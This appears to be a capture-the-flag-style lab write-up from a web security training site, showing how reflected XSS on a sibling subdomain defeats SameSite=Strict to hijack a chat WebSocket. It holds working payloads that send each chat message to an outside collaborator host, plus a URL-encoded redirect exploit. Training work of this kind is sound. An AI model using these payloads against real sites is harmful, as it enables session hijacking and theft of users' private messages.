SameSite Strict Bypass via Sibling Domain

**Category**: CSRF > WebSockets > CSWSH  
**Difficulty**: Practitioner  

---

##  Overview / What I Learned

- How to exploit a **cross-site WebSocket hijacking (CSWSH)** vulnerability despite SameSite cookie protections.
- How **reflected XSS on a sibling domain** can be used to bypass SameSite=Strict.
- Gained experience analyzing WebSocket handshakes and chat protocols.
- Learned that **browser same-site policies** treats sibling subdomains under the same site origin.

---

## Exploit Steps / Attack Methodology


###  1. Analyze WebSocket Behavior
- Navigated to `/chat` and observed messages being sent via WebSocket.
- In Burp  **WebSockets history**, noticed the `READY` message triggers the chat history in response.
- No CSRF token or authentication header in the WebSocket request — potentially CSWSH-vulnerable.


###  2. CSWSH PoC (Reference: Lab Instructions Step 3)
Tested this payload using the **exploit server** to confirm vulnerability:

```html
<script>
    var ws = new WebSocket('wss://LabId.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://collabid.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
Result: It worked, but only returned chat history for a new session — no session cookies sent due to SameSite=Strict.


### Step 4: Identify why session cookie isn’t sent
In HTTP history, inspect the /chat WebSocket request made by your PoC.
Notice: No session cookie is sent.
Check response headers when logging in:
You’ll see Set-Cookie: ...; SameSite=Strict
This blocks cookies from cross-site requests (your exploit is cross-site).


### Step 5: Discover a vulnerable sibling domain
Look through HTTP history. Check headers like Access-Control-Allow-Origin.
Find something like: cms-labId.web-security-academy.net
Visit https://cms-labId.web-security-academy.net
You’ll see a login form.


### Step 6: Find an XSS on sibling domain
Submit:
username: <script>alert(1)</script>
password: anything
You’ll see an alert  confirmed Reflected XSS.
Send the POST /login request to Repeater.
Change request method to GET.
Copy the URL and test it in the browser — the XSS still works.


### Step 7: Combine XSS and CSWSH payload
Take the working CSWSH script from earlier.
URL-encode it using URL encoder or Burp’s encoder:
%3Cscript%3Evar%20ws%3Dnew%20WebSocket%28%27wss%3A%2F%2F0a6900c4043b65cb80ee0d4000480072.web-security-academy.net%2Fchat%27%29%3Bws.onopen%3Dfunction%28%29%7Bws.send%28%22READY%22%29%3B%7D%3Bws.onmessage%3Dfunction%28event%29%7Bfetch%28%27https%3A%2F%2Fi8rmtdsdjp5zlivzfap3n3qnsey5mvak.oastify.com%27%2C%7Bmethod%3A%27POST%27%2Cmode%3A%27no-cors%27%2Cbody%3Aevent.data%7D%29%3B%7D%3B%3C%2Fscript%3E
Go back to the Exploit Server and paste this payload:

<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=PASTE_IT_HERE&password=anything";
</script>
Store and View exploit.

